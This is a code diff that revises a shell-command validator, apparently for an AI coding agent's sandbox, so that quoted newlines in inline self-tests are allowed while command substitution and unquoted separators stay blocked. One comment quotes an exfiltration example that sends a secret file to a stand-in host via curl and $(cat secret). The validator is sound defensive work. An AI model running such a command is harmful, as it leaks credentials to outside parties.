@@ -127,17 +127,28 @@ export function evaluateShellCommand(
       return { allowed: false, reason: "Blocked: multi-line commands not allowed.", userHint: USER_HINTS.commandShell };
     }
   } else {
-    // Bash: block backtick, $(), ${} (command substitution). Kept on the raw
-    // command — backtick/$() inside double quotes are still expanded by bash.
-    if (/[`\r\n]/.test(command) || /\$\(/.test(command) || /\$\{/.test(command)) {
+    // Bash: block command substitution — backtick, $(), ${}. Kept on the RAW
+    // command because backtick/$() inside DOUBLE quotes are still expanded by
+    // bash (so `curl "http://x/$(cat secret)"` stays blocked). A single-quoted
+    // occurrence is literal, but blocking it too is a rare, harmless FP.
+    if (/`/.test(command) || /\$\(/.test(command) || /\$\{/.test(command)) {
       return { allowed: false, reason: "Blocked: shell metacharacters detected (backtick or command substitution).", userHint: USER_HINTS.commandShell };
     }
-    // Block ; (sequential chaining) and a bare & (background) but allow && and ||.
+    // Separators — newline, ;, bare & — count only OUTSIDE quotes, so quote-strip
+    // first. A newline or `;` INSIDE a quoted argument (a multi-line
+    // `python3 -c 'line1\nline2'` self-test, or the `;` in `python -c "import
+    // json; ..."`) is literal string content, not command chaining. Before this
+    // was quote-aware, the newline check lived with the backtick check above and
+    // blocked EVERY multi-statement inline self-test (mislabeled as command
+    // substitution) — so a coding model couldn't run its own multi-line check
+    // and shipped unverified, false-done work. An UNQUOTED newline is still a
+    // command separator (like ;) and stays blocked.
     // The & exclusions also spare fd-redirect forms — 2>&1, >&2, &>file all carry
-    // a literal & that is job-control NOTHING (it's a descriptor dup/merge). Only
-    // a & with no adjacent redirect arrow is backgrounding. Separators count only
-    // OUTSIDE quotes — a `;` inside `python -c "import json; ..."` is shell-literal.
+    // a literal & that is job-control NOTHING (it's a descriptor dup/merge).
     const unquoted = stripQuotedSpans(command);
+    if (/[\r\n]/.test(unquoted)) {
+      return { allowed: false, reason: "Blocked: a newline outside quotes chains commands. Put multi-line code inside a single quoted -c/-e argument, e.g. python3 -c 'line1\\nline2', or write it to a file and run that.", userHint: USER_HINTS.commandShell };
+    }
     if (/;/.test(unquoted) || /(?<![&|<>])&(?![&|>])/.test(unquoted)) {
       return { allowed: false, reason: "Blocked: use && instead of ; for chaining, and don't background processes with &.", userHint: USER_HINTS.commandShell };
     }
